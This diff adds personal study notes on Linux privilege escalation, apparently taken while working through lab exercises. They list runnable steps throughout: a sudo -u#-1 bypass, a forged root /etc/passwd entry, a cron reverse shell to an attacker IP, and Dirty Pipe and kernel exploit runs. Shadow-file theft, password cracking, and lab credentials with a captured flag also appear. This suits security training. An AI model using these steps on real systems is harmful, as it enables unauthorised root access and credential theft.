@@ -1,0 +1,359 @@
+USEFUL COMMANDS
+-"ps" : view running processes for current shell
+-"ps -A" : view all running processes
+-"ps axjf" : view process tree
+-"ps aux" : processes for all users (a); user launched processes (u); not attached to a terminal (x)
+-"env" : environmental variables
+-" sudo -l" : list all commands the current user may execute with sudo 
+-"sudo -u#<user id> <command> : execute a command using the profile of the given <user id>, which might be in the sudoers file
+-"sudo visudo" : edit the sudoers file
+-"id" : overview of user's privileges; providing another username as an argument can reveal priviileges of that user
+-"/etc/passwd" : reveal users / usernames / accounts on the systems
+-"history" - some information about the target system and limited information on potentially captured usernames and passwords
+-"ifconfig" - network interfaces on the system; useful for pivoting
+-"ip route" - which network rou8tes exist
+-"netstat" - existing communications
+-"netstat -a" - show all listening ports and established connections
+-"netstat -at" or "-au" lists TCP or UDP protocols
+-"netstat -l" lists "listening" ports open to incoming communciations
+-"Netstat -lt" lists listening TCP ports
+-"Netstat -s" : lists useage statics by protocol can be also used with "-t" or "-u"
+-"netstat -tp": connections with the service name and PID information; add "l" to get listening ports
+-"netstat -i" interface statistics
+-"netstat -ano" : "a" display all sockets; 'n' do not resolve names; "o" display timers
+
+
+SUDO SECURITY BYPASS
+-CVE-2019-14287
+-admin needs to grant permission for a user to execute any command as another user, but not execute that command as root: adds line to sudoers : "<user> ALL=(ALL:!root) NOPASSWD: ALL"
+-attacker uses command : "sudo -u#-1 <command>" ; "-1" or unsigned equivalent (4294967295);
+-use "sudo -l" to figure out what the user can execute with sudo then figure out how to abuse one of those commands after you run it with the sudo -u 
+
+CVE-2021-4034: PWNKIT
+-security advisory: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+-impacts "Polkit" (policy kit) portion of the linux authorization system; is part of the systemd; determines if user requesting permissions is authorized those permissions
+-vulnerability contained within the "pkexec" utility
+-example: pkexec useradd <username> ; polkit activates to require a proper password to execute the add user function
+-vulnerability: command line arguments not handled correctly, allowing attacker to manipulate the environment with which the pkexec is run, through "out-of-bounds write"; 
+-by passing pkexec a null list of arguments, attacker can force it to write an environmental variable instead
+-many exploits written for the vulnerability
+-one exploit: https://github.com/arthepsy/CVE-2021-4034
+-vulnerability is patched, if the patch is installed
+
+
+
+ABUSING SUID/GUID FILES
+-"Set owner UserID" / "Group owner User ID"
+first step in linux privilege escalation: identify files with SUID/GUID bit set
+-allows files to run with permissions of the file owner/group
+-finding SUID binaries: 'find / -perm -u=s -type f 2>/dev/null'
+-'/' searches entire file system
+-'perm' searches for specific permissions
+-'u=s' searches for user permissions set to 's'
+-'type f' searches only for files
+-'2>/dev/null' ignores errors
+-another search: find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+--finds commands that execute
+--lists permissions
+--finds custom programs and other non-standard settings
+-user may not be allowed alter /etc/passwd (file), but to change the password, the passwd executable must be able to write to the file. A user needs to run passwd to edit their password.
+-with the u=s, when the user runs the file, the file runs with the permissions of the file owner; in the case of password changing, the user runs the passwd but the executable runs with the permissions of the owner, which is root
+
+EXPLOITING WRITEABLE /ETC/PASSWD
+-format: username : Password : User ID : Group ID : user meta data comment field : Home Directory : Command/Shell
+-username is what the user logs in with
+-Password: must use the 'passwd' command to compute the hash and to store the hash in the /etc/shadow file
+-User ID 0 is reserved for the root, 1-99 reserved for other predefined accounts, 100-999 reserved by system for administrative and system accounts and groups
+-exploiting requires writing new line entry according to the format
+
+CREATE COMPLIANT PASSWORD HASH
+-'openssl passwd -1 -salt[salt][password]'
+-'openssl passwd -1 -salt new 123' = $1$new$p7ptkEKU1HnaHpRtzNizS1
+-username : Password : User ID : Group ID : user meta data comment field : Home Directory : Command/Shell
+-new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
+
+
+EXPLOITING VI EDITOR
+-'sudo vi' opens vi properly
+-typing ':!sh' into vi editor opens a shell 
+
+EXPLOITING CRONTAB
+-executes commands at specific dates and times
+-one-time or recurring events
+-view schedule jobs: 'cat /etc/crontab'
+-format: [ID] [Minute] [hour] [day of the month] [day of the week] [user] [command]
+-example 17 * 1 * * * root cd /&& run-parts --report/etc/cron.hourly
+-exploiting means adding or altering the crontab file
+-format and add a line that runs a shell
+
+
+PATH VARIABLES
+-Linux environmental variable
+-specifies directories that hold executable programs for any command
+-for any command not built into the shel OR that is not defined with an absolute path, linux starts searching in folders defined under "PATH"
+-exploits mean re-writing PATH variable to a location chosen by the attacker
+-i.e. an SUID binary calls to an executable, but the attacker has redirected from the expected executable to a malicious executable.
+-typical $PATH is collection of colon separated directories where Linux looks for an unfamiliar command: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/lib/postgresql/10/bin/:/opt/smbmap
+-finding weriteable directories: "find / =writeable 2>/dev/null"
+-limit find results to easy/common paths: "find / =writeable 2>/dev/null | grep usr 
+-show only unique values: "find /=writeable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | uniq
+-finding writable directories may reveal no easily accesible directories, leaving tmp as the only option; but is tmp on the $PATH
+-add tmp to the path: export PATH=/tmp:$PATH
+-tmp is where to put a malicious executable
+
+
+
+
+ENUMERATION BY LINENUM
+-bash script
+-performs common commands related to privilege escalation
+-automates a process, but contains information which should be understood for manual processes
+-https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+-use of shell to get the script onto the target machien
+-'python3 -m http.server 8000' to set up local server
+-'wget' on target device to transmit file
+-'chmod +x <name of shell>'
+-'./LinEnum.sh'
+-world-writable files
+-SUID files
+-Crontab contents
+
+LINPEASE
+-search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts
+-https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+LINUX EXPLOIT SUGGESTER (LES)
+-assist in detecting security deficiencies for given Linux kernel/Linux-based machine
+-https://github.com/The-Z-Labs/linux-exploit-suggester
+
+LINUX SMART ENUMERATION
+-show relevant information about the security of the local Linux system, helping to escalate privileges.
+ -https://github.com/diego-treitos/linux-smart-enumeration
+
+LINUX PRIV CHECKER
+-executed locally on a Linux box to enumerate basic system info and search for common privilege escalation vectors such as word writable files, misconfigurations, clear-text password and applicable exploits.
+
+
+KERNEL EXPLOITS
+-Identify the kernel version; Search for and find an exploit code; Run the exploit
+-failed kernex exploit leads to system crash
+-https://www.linuxkernelcves.com/cves
+
+KERNEL PRIVILEGE ESCALATION
+-"cat /etc/issue" yields Ubuntu 14.04 LTS \n \l
+-'uname -a" indicates Linux Kernels 3.13
+-used karen's access to read the passwd file and found there is another user 'matt'
+-added 'matt' and 'root' to file 'users.txt
+-'hydra -t 32 -L users.txt -P <rockyou.txt>  <IP> ssh' let it run for a while but didn't let it finish, because it was not likely the way they are testing.
+-task 3 indicated the CVE is 2015-1328
+-exploit-db indicates there is a metasploit explit for this 'overlayfs' Local Privilege Escalation
+-tried to run the exploit, but it wouldn't work because it needed a session that was running in the background. But, I couldn't remember how to set up the connection to do that… nuts….
+-This required that I already have some user level permission on the target machine
+-this is where the username provided simulates the initial access
+-downloaded the exploit from exploit-db that was coded in "C" because the directions are easiest to follow. 
+-could also try ruby, later
+-put the downloaded exploit in the "tmp" folder and started a python server "python3 -m http.server 8000"
+-ssh into the target machine using the provided credentials. 
+-discovered there are zero places where "karen" has the ability to write
+-search for a reasonable directory where "karen" has write permissions: "find / -perm -u=w -type d 2>/dev/null > writable.txt
+-chose "/tmp" because it was the simplest
+-transfer the exploit file: wget http://<ip>:<port>/<exploit_file_name>
+-this is a "c" file it must be compiled: "gcc 37292.c -o exploit"
+-make the binary executable: "chmod +x exploit"
+-run the exploit: ./exploit
+-run "id" and see we have become root user
+-find -name flag1.txt : shows where the file is
+-"cat /home/matt/flag1.txt
+
+CVE-2022-0847 DIRTY PIPE
+-leads to privilege escalation because unprivileged processes can inject code into root processes.
+-vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.
+-Reference: https://dirtypipe.cm4all.com/
+-page: smallest unit of memory controlled by the CPU; typically 4 Kib
+-page cache: part of the kernel that manages pages
+-splice(): shortcut which speeds process of pushing contents of file into a pipe; moves REFERENCES to the pages rather than moveing the data
+-vulnerability: flags in Linux Kernel 4.9 and 5.8; allows user to tell kernel it's okay to wverwrite the data in a page; allows user to point pipes at page buffers that should be read only
+-opens target file with read-only flag set; prepares a malicious pip forcing the addition of the "PIPE_BUF_FLAG_CAN_MERGE" flag; uses "splice()" to make pipe point at desired section of the target file; writes arbitrary (malicious) data specified by user
+-EXERCISE 1:
+-exercise Username: tryhackme
+-Exercise Password: TryHackMe123!
+-i.e. ssh tryhackme@10.10.132.171
+-Local ip: 10.10.235.84
+-local exploit location: /home/tryhackme/Exploit/PoC/poc.c
+-First, must find a file which can be read; obvious choice is /etc/passwd
+-second, generate a valid password has useable in  the passwd file: openssl passwd -6 --salt THM "Password"
+-create a /etc/passwd entry based on the proper format of the file
+-username : Password : User ID : Group ID : user meta data comment field : Home Directory : Command/Shell
+-the new entry needs to be enclosed in quotes and there needs to be a new line at the end of the entry, so the ending quote needs to be on a new line to make sure the target file's line integrity remains
+-identify the offset: the location in the target file where this new entry will be inserted; the new entry will overwrite existing data;  the vulnerability will not append to the target file
+-target file: /etc/password
+-offset: "games" username
+-find the actual offset: grep -b games /etc/passwd 
+-actual offset: 189
+-this exercise assumes you have been able to transport the exploit to the target device
+-compile the exploit: gcc ~/Exploit/PoC/poc.c -o exploit
+-backup the target file: cp /etc/passwd /tmp/passwd.bkp
+-run exploit:  <path to exploit binary> <target file> <offset> <data for entry at offset>
+-run exploit: ./exploit /etc/passwd 189
+-switch user (su)
+
+
+
+
+
+
+
+
+
+
+
+
+
+SUDO -L
+-lists what commands a user may execute as a super user
+-may reveal unexpected capabilities
+
+GTFOBINS
+-curated list of unix binaries which can be exploited to bypass local security restrictions
+-useful breakdown of how to exploit misconfigurations
+-https://gtfobins.github.io/
+
+
+SUDO PRIVILEGE ESCALATION (using nano)
+-https://dev.to/christinec_dev/try-hack-me-linux-privesc-complete-write-up-20fg
+-check the contents of passwd to find there are two profiles: karen, and frank
+-run the "sudo -l command to find "karen" can run find, less, and nano
+-went to gtfobins.github.io to read about exploiting nano
+-"sudo nano" opens a new document but we don't actually want to write anything to it
+-press CTRL+R and CTRL+X to bring up a command line in the bar at the bottom of the window
+-enter "reset; bash 1>&0 2>&0" and press Enter to get root access.
+-note.. The instructions on gtfobins are very simple
+
+SUID PRIVILEGE ESCALATTION
+:> find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+-opeend the gtfobins and filtered for the SUID
+-started searching for the binaries that appear on the gtfobins and the "find results"
+-the first one that shows up is base64, and clicked on it
+-moved to /tmp to be sure I have write privileges
+-gtfobins has an instruction: ./base64 "$LFILE" | base64 --decode
+-my command: "base 64 /etc/passwd | base64 --decode > ps64.txt : which baseically copied the passwd file into my ps64.txt file
+-if trying to "cat" the shadow file, the logged in user doesn't have such privieliges, but the SUID of the base64 has the right privileges so, can actually read the shadow allowing us to copy the shadow file
+-my command: "base 64 /etc/shadow| base64 --decode > sh64.txt : which baseically copied the passwd file into my ps64.txt file
+-now to find the password of "user2"
+-command: "grep 'user2:' sh64.txt > user2sh.txt : this moved user2's shadow infomration to it's own file
+-command "grep 'user2:' ps64.txt >user2ps.txt : this moved user2's passwd infomration to its own file
+-copied both the shadow information and passwd information to corresponding files in the local THM VM
+-now to unshadow: unshadow user2pass.txt user2shad.txt > crackme.txt : consoldates the entries back togoether
+Crack: "john --wordlist=/usr/share/wordlists/rockyou.txt crackme.txt
+-user2 password: Password1
+-ssh into the machine as user2
+-"find / -name 'flag3.txt' -type f 2>/dev/null"
+-"cat /home/ubuntu/flag3.txt" : permission denied
+-back to the base64
+-"base64 /home/ubuntu/flag3.txt | base64 --decode" reveals the flag THM-3847834 
+
+CAPABILITIES PRIVILEGE ESCALATION
+-helps manage privileges at a more granular level
+-escalating the privileges of a binary, rather than a user
+-allows user to execute a binary to accomplish a task not normally available to the user
+-starts after you have a shell
+-Command: "getcap <filename>" lists capabilities of the binary given as "filename"
+-command: "getcap -r / 2>/dev/null" checks the entire system
+-check the whole system and then compare the results to gtfobins
+-this exercises uses vim: "vim = cap_setuid+ep"
+-gtfobins describes the potential vulnerability
+-"ls -l /usr/bin/vim" shows that permissions do not have the SUID bit set in permissions
+-the command from the website works, and gives us a very non-interactive shell
+-command: ./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+-command: cd /
+-command: find / -name flag4.txt -type f
+-command: cat /home/ubuntu/flag4.txt
+
+PRIVILEGE ESCALATION WITH CRONTABS
+-find cron job set by root and have it run own (malicious) script
+-command: cat /etc/passwd: to interetings profiles (karen, matt)
+-command: cat /etc/shadow: karen cannot run
+-command: sudo - l Karen cannot do this
+-command: cat /etc/crontab": there are 8 scripts, but only four are user defined; one of them is /home/karen/backup.sh (run as root)
+-nothing specifically defines them as user-defined, but in this case, there are not timeframes established. 
+-identify frequently run scripts
+-identify needed privileges (current user or higher) to run the binary / script
+-likely want to use a reverse shell, so need to have a local listener
+-set up local listener
+-move to the locating storing the backup.sh and change the name of the original file to add a .bak extension, this will preserve the original so we can cover tracks later
+-make a new backup.sh with command: mv backup.sh backup.sh.bak
+-new file command: nano backup.sh
+-append the text to open  the reverse shell: cat bash -i >& /dev/tcp/<attacker IP>/<listening port> 0>&1
+-also added command: chmod +x backup.sh
+-wait until the cron runs  and you get the reverse shell
+-cd /
+-find / -name flag5.txt -type f
+-cat /home/ubuntu/flag5.txt
+-to decrypt a password we will mke a create a passwd file and a shadow file on the local machine, copy the contents of passwd and shadow from remote machine to local machine, isolate matt's information and crack the hash with john 
+-unshadow <local passwd file copy> <local shadow file copy> > <crackme.txt>
+
+
+PATH PRIVILEGE ESCALATION
+-Questions to answer when seeking to exploit PATH:
+--What folders are located under $PATH?
+--Does current user have write privileges for any of these folders?
+--Can current user modify $PATH?
+--Is there a script/application you can start that will be affected by this vulnerability?
+-find /=writeable -type d 2>/dev/null | cut -d "/" -f 1,2,3 | sort | uniq > sResults.txt
+-found another user with a writeable directory: home/murdoch/
+-change directory to /home/murdoch
+-there are two files: test (ELF), and thm.py (script)
+-running test (./test) indicates dependency on another executable ./thm
+-create the executable, and insert a script that will read the flag6.thm: echo "cat /home/matt/flag6.txt" > thm
+-chmod +x thm
+-add the path: "export PATH=/home/murdoch:$PATH
+-execute the ./test and you have root
+
+NFS PRIVILEGE ESCALATION
+-NFS configuration is kept in /etc/exports file; usually readable by users
+-make a directory on attacking machine that will be used as a mount point: mkdir /tmp/PEMount
+-gain access to a shell on the target machine
+-enumerate shares on target machine: showmount -e <IP>
+-figure out which of the shares has no_root_squash set: cat /etc/exports
+-three: "/home/backup" and "/tmp" and "/home/ubuntu/sharedfolder
+-figure out which, if any, the current user can read/write
+-mount a no_root_squash share to the local attacking machine: mount -o rw 10.10.48.95:/home/ubuntu/sharedfolder /tmp/target
+-change directory to the folder: cd /tmp/target
+-need to write a script that will set the right bits and open a shell; not sure how to do this in python, need to figure it out
+--touch nsfx.c
+--in C
+--int main(){ { setgid(0); setuid(0); system("/bin/bash"); return 0; } each command on separate line, normal C formatting
+-compile the binary: gcc nfsx.c -o nfsx -w
+-make the file executable and set the SUID bit: chmod +xs nfsx
+-move to the target machine and make sure you can see the new binary: ls -alh
+-run the malicious exploit: ./nfsx
+-receive root
+-find / -name flag7.txt -type f
+-cat /home/matt/flag7.txt
+
+
+SHELL ESCAPING
+-misconfiguration problem
+-ability to run some binaries or misconfigured programs as sudo
+-run "sudo -l"
+-compare the results of the list to gtfobins to identify ways to exploit those binaries using sudo to get root privileges
+
+
+SYSTEMCTL
+-gtfobins: https://gtfobins.github.io/gtfobins/systemctl/
+-What we do is creating a service, which reads the root flag and outputs it to /tmp/output. This service is saved in a variable called TF.
+-The gtfobins are only a basic source one potential edit starts with a basic exploit:
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+systemctl link $TF
+systemctl enable --now $TF
+
+Replaced the fourth line to get actual root privileges: ExecStart=/bin/sh -c “chmod +s /bin/bash”
+
+-then run "bash -p" to run bash in privileged mode
+-use "whoami" to verify root
